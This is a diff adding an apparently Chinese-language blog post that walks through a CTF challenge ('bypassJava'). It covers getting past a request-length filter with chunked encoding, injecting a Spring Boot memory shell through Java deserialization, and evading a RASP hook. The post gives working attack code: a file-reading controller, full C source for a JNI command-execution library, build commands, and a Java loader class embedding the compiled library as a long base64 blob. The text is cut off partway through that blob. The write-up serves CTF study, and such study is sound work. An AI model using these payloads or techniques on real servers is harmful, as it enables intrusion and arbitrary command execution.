@@ -1,0 +1,496 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[DASCTF_X_CBCTF2023]bypassJava | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[DASCTF_X_CBCTF2023]bypassJava | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="题目环境
+官方WP：https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/
+环境详情：https://github.com/pankass/DASCTF_X_CBCTF2..." />
+    <meta name="keywords" content="RASP,JNI,Java反序列化,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [DASCTF_X_CBCTF2023]bypassJava
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-03-01
+              </span>
+              <span>
+                10 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/RdQyyjwxV/" class="post-tag">
+                  # RASP
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/M5ML4eNNKG/" class="post-tag">
+                  # JNI
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/VnhegNlf7/" class="post-tag">
+                  # Java反序列化
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/dasctf_x_cbctf2023bypassjava.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="题目环境">题目环境</h1>
+<p>官方WP：<a href="https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/">https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/</a><br>
+环境详情：<a href="https://github.com/pankass/DASCTF_X_CBCTF2023_bypassJava">https://github.com/pankass/DASCTF_X_CBCTF2023_bypassJava</a></p>
+<h1 id="解题流程">解题流程</h1>
+<p>Controller很简单，<code>/read</code>有个反序列化利用点<br>
+<img src="https://skyblu3519.github.io/post-images/1709264488562.png" alt="" loading="lazy"></p>
+<p>但是Filter中对ContentLength做了长度限制，这个1145这个长度显然是打不了任何payload的。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264512228.png" alt="" loading="lazy"></p>
+<p>深入调试，分析<code>getContentLength()</code>获取请求体长度的逻辑。<code>servletRequest.getContentLength()</code>直接返回了<code>Request.contentLength</code>这个属性。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264521012.png" alt="" loading="lazy"></p>
+<p>追踪这个属性。在<code>org.apache.coyote.http11.Http11Processor#prepareInputFilters</code>方法进行的赋值<br>
+<img src="https://skyblu3519.github.io/post-images/1709264550106.png" alt="" loading="lazy"></p>
+<p><code>getContentLengthLong</code>方法直接获取header中的content-length字段为<code>contentLength</code>赋值<br>
+<img src="https://skyblu3519.github.io/post-images/1709264559191.png" alt="" loading="lazy"></p>
+<p>而在<code>contentLength</code>赋值后的代码中，如果<code>contentDelimitation</code>被设置为True，<code>contentLength</code>会被修改为-1。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264567213.png" alt="" loading="lazy"></p>
+<p>通过对<code>contentDelimitation</code>的追踪，可以发现它是表示报文有没有进行分块传输的<br>
+<img src="https://skyblu3519.github.io/post-images/1709264590375.png" alt="" loading="lazy"></p>
+<p>如果transfer-encoding是chunked，那么<code>contentDelimitation</code>就会被修改为True<br>
+<img src="https://skyblu3519.github.io/post-images/1709264598200.png" alt="" loading="lazy"></p>
+<p>所以可以通过<code>Transfer-Encoding: chunked</code>绕过filter中的长度限制（BP插件），然后打个SpringBoot内存马。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264607089.png" alt="" loading="lazy"></p>
+<p>然后发现存在RASP，forkAndExec被hook了。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264620663.png" alt="" loading="lazy"></p>
+<p>虽然执行不了命令，但可以用<code>java.nio.file</code>对文件进行读取。重新注册一个读文件的Controller</p>
+<pre><code class="language-java">public void fileAccess(HttpServletRequest req, HttpServletResponse res) throws Exception {
+    String filedir = req.getParameter(&quot;filedir&quot;);
+    String filename = req.getParameter(&quot;filename&quot;);
+
+    if (filedir != null) {
+        PrintWriter out = res.getWriter();
+        File dir = new File(filedir);
+        if (dir.exists() &amp;&amp; dir.isDirectory()) {
+            File[] files = dir.listFiles();
+            if (files != null) {
+                Arrays.stream(files).forEach(file -&gt; out.println(file.getName()));
+            } else {
+                out.println(&quot;No files found in the directory.&quot;);
+            }
+        } else {
+            out.println(&quot;Directory does not exist or is not a directory.&quot;);
+        }
+    } else if (filename != null) {
+        File file = new File(filename);
+        if (file.exists() &amp;&amp; file.isFile()) {
+            // 使用 FileInputStream 读取文件
+            try (FileInputStream in = new FileInputStream(file)) {
+                byte[] buffer = new byte[1024];
+                int bytesRead;
+                while ((bytesRead = in.read(buffer)) != -1) {
+                    res.getOutputStream().write(buffer, 0, bytesRead);
+                }
+            } catch (IOException e) {
+                res.getWriter().println(&quot;Error reading file: &quot; + e.getMessage());
+            }
+        } else {
+            res.getWriter().println(&quot;File does not exist or is not a file.&quot;);
+        }
+    } else {
+        res.getWriter().println(&quot;Please provide a valid 'filedir' or 'filename' parameter.&quot;);
+    }
+
+}
+</code></pre>
+<p>filedir参数读取目录结构，filename参数读取文件内容。然后接可以发现/home/ctf目录下的RASP程序simpleRASP.jar<br>
+<img src="https://skyblu3519.github.io/post-images/1709264646865.png" alt="" loading="lazy"></p>
+<p><code>?filename=/home/ctf/simpleRASP.jar</code>读取下来后开始审计。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264653194.png" alt="" loading="lazy"></p>
+<p>这个程序是为一个运行的JVM添加一个代理。Main会把MyAgent打入SpringBoot中，然后执行MyAgent的agentmain方法。<br>
+<img src="https://skyblu3519.github.io/post-images/1709264660091.png" alt="" loading="lazy"></p>
+<p>这段代码做了两件事：</p>
+<ol>
+<li>添加了一个ClassFileTransformer，名字是MyAgentTransformer</li>
+<li>如果java.lang.UNIXProcess和java.lang.ClassLoader已经加载，则用MyAgentTransformer重新定义 Class。</li>
+</ol>
+<p>MyAgentTransformer对这两个类执行了不同的的transformed方法<br>
+<img src="https://skyblu3519.github.io/post-images/1709264703222.png" alt="" loading="lazy"></p>
+<p>HookRce.transformed hook了forkAndExec（无法执行命令），HookJNI hook了loadLibrary0（无法使用System.load）。但是<code>java.lang.ClassLoader.NativeLibrary#load</code> 并未被 hook，并且反射也是可以正常使用的，所以可以使用反射来调用 <code>java.lang.ClassLoader.NativeLibrary</code> 中的 load 方法来加载恶意so文件执行命令。</p>
+<p>制作JNI。准备EvilClass.java</p>
+<pre><code class="language-java">public class EvilClass  {
+    public static native String execCmd(String cmd);
+}
+</code></pre>
+<p>在当前目录运行，生成 EvilClass.h</p>
+<pre><code class="language-shell">javac EvilClass.java
+javah EvilClass
+</code></pre>
+<p>根据EvilClass.h文件编写EvilClass.c文件</p>
+<pre><code class="language-c">#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &quot;EvilClass.h&quot;
+
+int execmd(const char *cmd, char *result)
+{
+    char buffer[1024*12];              //定义缓冲区
+    FILE *pipe = popen(cmd, &quot;r&quot;); //打开管道，并执行命令
+    if (!pipe)
+        return 0; //返回0表示运行失败
+
+    while (!feof(pipe))
+    {
+        if (fgets(buffer, 128, pipe))
+        { //将管道输出到result中
+            strcat(result, buffer);
+        }
+    }
+    pclose(pipe); //关闭管道
+    return 1;      //返回1表示运行成功
+}
+JNIEXPORT jstring JNICALL Java_EvilClass_execCmd(JNIEnv *env, jclass class_object, jstring jstr)
+{
+
+    const char *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, NULL);
+    char result[1024 * 12] = &quot;&quot;; //定义存放结果的字符串数组
+    if (1 == execmd(cstr, result))
+    {
+        // printf(result);
+    }
+
+    char return_messge[100] = &quot;&quot;;
+    strcat(return_messge, result);
+    jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge);
+    //system();
+
+    return cmdresult;
+}
+</code></pre>
+<p>编译生成对应动态链接库文件</p>
+<pre><code class="language-shell">gcc -fPIC -I $JAVA_HOME/include  -I $JAVA_HOME/include/linux -shared -o libcmd.so EvilClass.c
+</code></pre>
+<p>将该so文件base64编码放到java代码中方便加载。这段代码首先会把libcmd.so写入，然后加载。之后调用native方法EvilClass.execCmd的时候，就是我们动态加载库实现的。</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
+import org.springframework.web.servlet.mvc.condition.PathPatternsRequestCondition;
+import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
+import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
+import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
+import org.springframework.web.servlet.support.RequestContextUtils;
+import org.springframework.web.util.pattern.PathPattern;
+import org.springframework.web.util.pattern.PathPatternParser;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.*;
+
+public class EvilClass extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {
+    public static native String execCmd(String cmd);
+
+    static {
+        try {
+            String Evil_B64 = &quot;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AwALAJAHAAAAAAAAAAAAAAAAAAAAAAAAAwAMAEQKAAAAAAAAAAAAAAAAAAAAAAAAAwANAFgKAAAAAAAAAAAAAAAAAAAAAAAAAwAOAFwKAAAAAAAAAAAAAAAAAAAAAAAAAwAPAJgKAAAAAAAAAAAAAAAAAAAAAAAAAwAQANgNAQAAAAAAAAAAAAAAAAAAAAAAAwARAOANAQAAAAAAAAAAAAAAAAAAAAAAAwASAOgNAQAAAAAAAAAAAAAAAAAAAAAAAwATALgPAQAAAAAAAAAAAAAAAAAAAAAAAwAUAOgPAQAAAAAAAAAAAAAAAAAAAAAAAwAVAFAQAQAAAAAAAAAAAAAAAAAAAAAAAwAWAFgQAQAAAAAAAAAAAAAAAAAAAAAAAwAXAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAIAAAAAAALAJAHAAAAAAAAAAAAAAAAAAALAAAAAgALAJAHAAAAAAAAFAAAAAAAAAAIAAAAAAAJALAGAAAAAAAAAAAAAAAAAAAIAAAAAAAMAEQKAAAAAAAAAAAAAAAAAAAYAAAABADx/wAAAAAAAAAAAAAAAAAAAAAIAAAAAAAJAMAGAAAAAAAAAAAAAAAAAAAIAAAAAAAMAFAKAAAAAAAAAAAAAAAAAAAfAAAABADx/wAAAAAAAAAAAAAAAAAAAAAIAAAAAAALALAHAAAAAAAAAAAAAAAAAAAqAAAAAgALALAHAAAAAAAAAAAAAAAAAAAsAAAAAgALAOAHAAAAAAAAAAAAAAAAAAA/AAAAAAAVAFAQAQAAAAAAAAAAAAAAAABCAAAAAgALACAIAAAAAAAAAAAAAAAAAABYAAAAAQAWAFgQAQAAAAAAAQAAAAAAAAA/AAAAAAARAOANAQAAAAAAAAAAAAAAAABkAAAAAQARAOANAQAAAAAAAAAAAAAAAACLAAAAAgALAHAIAAAAAAAAAAAAAAAAAAA/AAAAAAAQANgNAQAAAAAAAAAAAAAAAACXAAAAAQAQANgNAQAAAAAAAAAAAAAAAAA/AAAAAAAPAKwKAAAAAAAAAAAAAAAAAAA/AAAAAAAWAFgQAQAAAAAAAAAAAAAAAAC2AAAABADx/wAAAAAAAAAAAAAAAAAAAAA/AAAAAAANAFgKAAAAAAAAAAAAAAAAAAAIAAAAAAALAHQIAAAAAAAAAAAAAAAAAAA/AAAAAAAPABALAAAAAAAAAAAAAAAAAAAfAAAABADx/wAAAAAAAAAAAAAAAAAAAAA/AAAAAAAPAFgLAAAAAAAAAAAAAAAAAADCAAAAAQAPAFgLAAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAADQAAAAAgAMAEQKAAAAAAAAAAAAAAAAAADWAAAAAQAVAFAQAQAAAAAAAAAAAAAAAADjAAAAAQDx/+gNAQAAAAAAAAAAAAAAAADsAAAAAAAOAFwKAAAAAAAAAAAAAAAAAAD/AAAAAQAVAFgQAQAAAAAAAAAAAAAAAAALAQAAAQDx/7gPAQAAAAAAAAAAAAAAAAAhAQAAAgAJALAGAAAAAAAAAAAAAAAAAAAIAAAAAAAKANAGAAAAAAAAAAAAAAAAAAAnAQAAIAAAAAAAAAAAAAAAAAAAAAAAAABDAQAAIgAAAAAAAAAAAAAAAAAAAAAAAABdAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABuAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACAAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACSAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACuAQAAIAAAAAAAAAAAAAAAAAAAAAAAAAC9AQAAEQAAAAAAAAAAAAAAAAAAAAAAAADaAQAAEgAAAAAAAAAAAAAAAAAAAAAAAADqAQAAEgALAHQIAAAAAAAA0AAAAAAAAADxAQAAEgALAEQJAAAAAAAAAAEAAAAAAAAIAgAAEgAAAAAAAAAAAAAAAAAAAAAAAAAaAgAAIAAAAAAAAAAAAAAAAAAAAAAAAAA0AgAAEgAAAAAAAAAAAAAAAAAAAAAAAAAAY3J0aS5vACR4AGNhbGxfd2Vha19mbgBjcnRuLm8AY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwAkZABfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjAAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AEV2aWxDbGFzcy5jAF9fRlJBTUVfRU5EX18AX2ZpbmkAX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1RNQ19FTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AX2luaXQAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEdMSUJDXzIuMTcAcG9wZW5AR0xJQkNfMi4xNwBzdHJjYXRAR0xJQkNfMi4xNwBtZW1zZXRAR0xJQkNfMi4xNwBfX3N0YWNrX2Noa19mYWlsQEdMSUJDXzIuMTcAX19nbW9uX3N0YXJ0X18AX19zdGFja19jaGtfZ3VhcmRAR0xJQkNfMi4xNwBmZW9mQEdMSUJDXzIuMTcAZXhlY21kAEphdmFfRXZpbENsYXNzX2V4ZWNDbWQAcGNsb3NlQEdMSUJDXzIuMTcAX0lUTV9yZWdpc3RlclRNQ2xvbmVUYWJsZQBmZ2V0c0BHTElCQ18yLjE3AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5pbml0AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRfYXJyYXkALmZpbmlfYXJyYXkALmR5bmFtaWMALmdvdAAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAAAABwAAAAIAAAAAAAAAyAEAAAAAAADIAQAAAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAALgAAAPb//28CAAAAAAAAAPABAAAAAAAA8AEAAAAAAAAoAAAAAAAAAAMAAAAAAAAACAAAAAAAAAAAAAAAAAAAADgAAAALAAAAAgAAAAAAAAAYAgAAAAAAABgCAAAAAAAAmAEAAAAAAAAEAAAAAwAAAAgAAAAAAAAAGAAAAAAAAABAAAAAAwAAAAIAAAAAAAAAsAMAAAAAAACwAwAAAAAAAOcAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAASAAAAP///28CAAAAAAAAAJgEAAAAAAAAmAQAAAAAAAAiAAAAAAAAAAMAAAAAAAAAAgAAAAAAAAACAAAAAAAAAFUAAAD+//9vAgAAAAAAAADABAAAAAAAAMAEAAAAAAAAQAAAAAA